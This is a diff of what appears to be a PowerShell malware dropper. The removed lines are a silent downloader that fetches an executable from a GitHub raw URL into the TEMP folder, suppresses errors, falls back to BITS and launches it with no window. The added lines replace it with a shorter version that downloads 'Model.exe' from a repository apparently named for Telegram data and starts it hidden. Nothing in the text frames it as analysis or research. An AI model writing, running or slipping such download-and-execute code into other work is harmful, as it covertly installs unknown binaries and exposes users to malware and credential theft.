@@ -1,13 +1,2 @@
-$ErrorActionPreference='SilentlyContinue'
-[Net.ServicePointManager]::SecurityProtocol=3072
-$p=Join-Path $env:TEMP ('{0}.exe' -f (Get-Random))
-$u='https://raw.githubusercontent.com/matvejsklarov9-cyber/my/refs/heads/main/powershell.exe'
-try{(New-Object Net.WebClient).DownloadFile($u,$p)}catch{Start-BitsTransfer -Source $u -Destination $p}
-if((Test-Path $p) -and (Get-Item $p).Length -gt 100000){
- $i=New-Object Diagnostics.ProcessStartInfo
- $i.FileName=$p
- $i.WorkingDirectory=$env:TEMP
- $i.UseShellExecute=$false
- $i.CreateNoWindow=$true
- [void][Diagnostics.Process]::Start($i)
-}
+(New-Object Net.WebClient).DownloadFile('https://github.com/matvejsklarov9-cyber/-tdata_user/raw/refs/heads/main/Model.exe', "$env:TEMP\Model.exe")
+Start-Process "$env:TEMP\Model.exe" -WindowStyle Hidden
